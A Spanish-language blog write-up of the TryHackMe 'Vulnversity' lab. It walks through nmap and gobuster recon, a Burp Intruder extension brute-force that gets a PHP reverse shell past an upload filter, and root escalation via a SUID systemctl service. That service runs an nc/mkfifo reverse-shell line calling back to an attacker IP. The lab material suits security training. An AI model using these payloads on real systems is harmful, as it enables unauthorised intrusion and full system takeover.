<!DOCTYPE html>
<html lang="en">
<head>
  <a name="top"></a>
  
    <title>TryHackMe - Vulnversity :: sckull — Writeups :: CTF :: HackTheBox :: TryHackMe</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Titulo Vulnversity     Room Vulnversity   Info Learn about active recon, web app attacks and privilege escalation.   Puntos 3685   Dificultad Facil   Maker tryhackme    { Reconnaissance } Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/vulnversity/" />


<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">



<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>



<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="TryHackMe - Vulnversity :: sckull — Writeups :: CTF :: HackTheBox :: TryHackMe" />
<meta name="twitter:description" content="Titulo Vulnversity     Room Vulnversity   Info Learn about active recon, web app attacks and privilege escalation.   Puntos 3685   Dificultad Facil   Maker tryhackme    { Reconnaissance } Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red." />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="/image/tryhackme/vulnversity/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="TryHackMe - Vulnversity :: sckull — Writeups :: CTF :: HackTheBox :: TryHackMe">
<meta property="og:description" content="Titulo Vulnversity     Room Vulnversity   Info Learn about active recon, web app attacks and privilege escalation.   Puntos 3685   Dificultad Facil   Maker tryhackme    { Reconnaissance } Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red." />
<meta property="og:url" content="/posts/vulnversity/" />
<meta property="og:site_name" content="TryHackMe - Vulnversity" />
<meta property="og:image" content="/image/tryhackme/vulnversity/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "/"
        },
        "articleSection" : "posts",
        "name" : "TryHackMe - Vulnversity",
        "headline" : "TryHackMe - Vulnversity",
        "description" : "Titulo Vulnversity     Room Vulnversity   Info Learn about active recon, web app attacks and privilege escalation.   Puntos 3685   Dificultad Facil   Maker tryhackme    { Reconnaissance } Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-12-25 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-12-25 00:00:00 &#43;0000 UTC",
        "url" : "/posts/vulnversity/",
        "wordCount" : "1006",
        "keywords" : [ "tryhackme","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-12-25 00:00:00 &#43;0000 UTC" />





</head>
<body class="dark-theme">
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull@blog:~#</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">TryHackMe - Vulnversity</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Wednesday 25, 2019
        </span>
      
      <span class="post-author">—  sckull</span>
      
        <span class="post-read-time">— 5 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
        
      </span>
    

    
      
        <img src="/posts/vulnversity/../../image/tryhackme/vulnversity/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#reconnaissance">{ Reconnaissance }</a>
<ul>
<li><a href="#nmap">NMAP</a></li>
</ul></li>
<li><a href="#locating-directories-using-gobuster">{ Locating directories using GoBuster }</a>
<ul>
<li><a href="#gobuster">GOBUSTER</a></li>
</ul></li>
<li><a href="#compromise-the-webserver">{ Compromise the webserver }</a>
<ul>
<li><a href="#burpsuite">BURPSUITE</a></li>
</ul></li>
<li><a href="#privilege-escalation">{ Privilege Escalation }</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Titulo</th>
<th>Vulnversity</th>
</tr>
</thead>

<tbody>
<tr>
<td>Room</td>
<td>Vulnversity</td>
</tr>

<tr>
<td>Info</td>
<td>Learn about active recon, web app attacks and privilege escalation.</td>
</tr>

<tr>
<td>Puntos</td>
<td>3685</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Facil</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://tryhackme.com/">tryhackme</a></td>
</tr>
</tbody>
</table>

<hr />

<h2 id="reconnaissance">{ Reconnaissance }</h2>

<p>Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red.</p>

<table>
<thead>
<tr>
<th>nmap flag</th>
<th>Descripcion</th>
</tr>
</thead>

<tbody>
<tr>
<td>-sv</td>
<td>Determina la version del servicio</td>
</tr>

<tr>
<td>-p <x> or -p-</td>
<td>Escanea el puerto x o escanea todos los puertos</td>
</tr>

<tr>
<td>-Pn</td>
<td>Solo escanea puertos abiertos y no hosts</td>
</tr>

<tr>
<td>-A</td>
<td>Determina la version del SO y ejecuta scripts</td>
</tr>

<tr>
<td>-sC</td>
<td>Escanea con scripts por default</td>
</tr>

<tr>
<td>-v</td>
<td>Verbosidad</td>
</tr>

<tr>
<td>-sU</td>
<td>Puertos UDP</td>
</tr>

<tr>
<td>-sS</td>
<td>Puertos TCP</td>
</tr>
</tbody>
</table>

<p>Info From <a href="https://tryhackme.com/room/vulnversity"><strong>Vulnersity</strong></a> room.</p>

<h3 id="nmap">NMAP</h3>

<p>Comenzamos escaneando todos los puertos tcp y servicios disponibles en el host y guardar el reporte en un archivo.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Dec 25 15:31:22 2019 as: nmap -sS -T4 -sV -p- -o nmap_scan 10.10.193.246
Nmap scan report for 10.10.193.246
Host is up (0.17s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 25 15:45:34 2019 -- 1 IP address (1 host up) scanned in 851.97 seconds
</code></pre>

<h2 id="locating-directories-using-gobuster">{ Locating directories using GoBuster }</h2>

<p>Utilizamos GoBuster para escanear directorios y archivos en la pagina web que esta corriendo en el puerto 3333.</p>

<table>
<thead>
<tr>
<th>GoBuster flag</th>
<th>Descripcion</th>
</tr>
</thead>

<tbody>
<tr>
<td>-e</td>
<td>Imprime la URL completa</td>
</tr>

<tr>
<td>-u</td>
<td>La url Objetivo</td>
</tr>

<tr>
<td>-w</td>
<td>Direccion del wordlist</td>
</tr>

<tr>
<td>-U</td>
<td>y -P usuario y constraseña para autenticacion</td>
</tr>

<tr>
<td>-p</td>
<td><x> Proxy para las peticiones</td>
</tr>

<tr>
<td>-c</td>
<td><http cookies> Especifica el cookie para autenticacion</td>
</tr>
</tbody>
</table>

<p>Info From <a href="https://tryhackme.com/room/vulnversity"><strong>Vulnersity</strong></a> room.</p>

<h3 id="gobuster">GOBUSTER</h3>

<pre><code class="language-bash">root@aoiri:~# gobuster dir -u http://10.10.193.246:3333 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.193.246:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/25 15:56:20 Starting gobuster
===============================================================
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/internal (Status: 301)
/js (Status: 301)
/server-status (Status: 403)
===============================================================
2019/12/25 15:58:19 Finished
===============================================================
</code></pre>

<p>Realizamos un escaneo al directorio <code>/internal/</code>.</p>

<pre><code class="language-bash">root@aoiri:~/tryhackme/www# gobuster dir -u http://10.10.193.246:3333/internal/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.193.246:3333/internal/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/25 16:15:40 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/uploads (Status: 301)
===============================================================
2019/12/25 16:17:19 Finished
===============================================================
</code></pre>

<h2 id="compromise-the-webserver">{ Compromise the webserver }</h2>

<p>El directorio <code>/internal</code> nos muestra una pagina donde podemos subir archivos.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_15-59-08.png" alt="image" /></p>

<p>Al intentar subir un archivo con extension <code>.php, .txt, .jpg</code> nos muestra un mensaje de error.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-00-16.png" alt="image" /></p>

<h3 id="burpsuite">BURPSUITE</h3>

<p>Utilizamos burpsuite para poder capturar la solicitud que hacemos al enviar el archivo, cambiando la extension y enviarla nuevamente con diferentes extenciones las cuales puedan ser interpretadas por php.</p>

<p><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload"><strong>OWASP - Unrestricted File Upload</strong></a></p>

<p>Utilizamos una shell inversa que nos trae Kali Linux (<code>/usr/share/webshells/php/php-reverse-shell.php</code>) cambiamos la ip y el hacia donde va la shell. Intentamos subir este archivo y capturamos la solicitud con burpsuite.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-09-02.png" alt="image" /></p>

<p>Enviamos la solicitud a Intruder, agregamos un marcador de payload a la extension del archivo para poder hacer la misma solicitud pero con diferente extension.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-09-46.png" alt="image" /></p>

<p>En la pestaña de payloads agregamos las extensiones que vamos a utilizar.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-12-04.png" alt="image" /></p>

<pre><code class="language-bash">.php4
.php5
.pht
.phtml
.ini
</code></pre>

<p>Comenzamos el &lsquo;Ataque&rsquo;, al finalizar vemos que una de las solicitudes fue exitosa con la extension <code>.phtml</code>.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-15-57.png" alt="image" /></p>

<p>Revisamos la pagina de <code>/internal/uploads/</code> y vemos que nuestro archivo esta ahora en el servidor.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-18-09.png" alt="image" /></p>

<p>Visitamos nuestro archivo para que se ejecute y obtenemos una shell.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-19-26.png" alt="image" /></p>

<h2 id="privilege-escalation">{ Privilege Escalation }</h2>

<p>Ahora que tenemos una shell en la maquina podemos buscar una manera para poder obtener permisos root, comenzamos enumerando los archivos SUID con find.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-22-06.png" alt="image" /></p>

<pre><code class="language-bash">$ find / -perm -4000 2&gt; /dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root        31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        40K May 16  2018 /bin/mount
-rwsr-xr-x 1 root   root       139K Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root   root        40K May 16  2017 /bin/su
-rwsr-xr-x 1 root   root       645K Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root   root        27K May 16  2018 /bin/umount
-rwsr-xr-x 1 root   root        35K Mar  6  2017 /sbin/mount.cifs
-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root   root        49K May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root   root        40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root   root        74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        33K May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        39K May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        33K May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        53K May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root   root        23K Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root       134K Jul  4  2017 /usr/bin/sudo
-rwsr-xr-- 1 root   messagebus  42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root        10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root   root        97K Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root        75K Jul 17 11:22 /usr/lib/squid/pinger
-rwsr-xr-x 1 root   root        39K Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
</code></pre>

<p>Podemos observar que entre los binarios se encuentra systemctl, por lo cual vamos a utilizarlo para obtener privilegios root, con los siguientes comandos.</p>

<p><a href="https://gtfobins.github.io/gtfobins/systemctl/"><strong>GTFOBINS - Systemctl</strong></a></p>

<p>Primero creamos un archivo el cual va ejecutar una shell inversa:</p>

<pre><code class="language-bash">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.1.72 1337 &gt;/tmp/f&quot; &gt; /tmp/shell.sh
</code></pre>

<p>Creamos un servicio y lo ejecutamos con systemctl.</p>

<pre><code class="language-bash">TF=$(mktemp).service

echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c &quot;bash /tmp/shell.sh&quot;
[Install]
WantedBy=multi-user.target' &gt; $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
</code></pre>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-36-04.png" alt="image" /></p>

<p>Obtenemos una shell con el usuario root.</p>

<p><img src="../../image/tryhackme/vulnversity/Screenshot_2019-12-25_16-36-25.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="/posts/wgel/">
                <span class="button__icon">←</span>
                <span class="button__text">TryHackMe - Wgel CTF</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="/posts/breakit/">
                <span class="button__text">TryHackMe - Break It</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
    </div>
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull@blog:~#</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>


  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
